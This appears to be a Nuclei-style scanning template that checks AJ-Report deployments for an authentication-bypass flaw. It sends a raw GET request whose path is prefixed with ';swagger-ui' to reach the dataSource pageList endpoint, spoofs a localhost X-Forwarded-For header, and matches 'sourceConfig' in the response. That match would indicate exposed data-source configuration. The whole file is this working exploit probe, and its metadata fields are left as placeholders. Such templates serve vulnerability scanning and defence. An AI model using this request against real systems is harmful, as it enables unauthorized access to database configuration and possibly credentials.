id: AJ-Report-pageList-unauth
info:
  name: Template Name
  author: apple
  severity: high
  description: description
  reference:
    - https://github.com/anji-plus/report/issues/34
    - https://mp.weixin.qq.com/s/HsH_nEI5SyOP_Y9Qbm0A1w
  tags: tags
http:
  - raw:
      - |+
        GET /;swagger-ui/dataSource/pageList?showMoreSearch=false&pageNumber=1&pageSize=10 HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        x-forwarded-for: 127.0.0.1
        Connection: keep-alive

    matchers:
      - type: word
        part: body
        words:
          - 'sourceConfig'
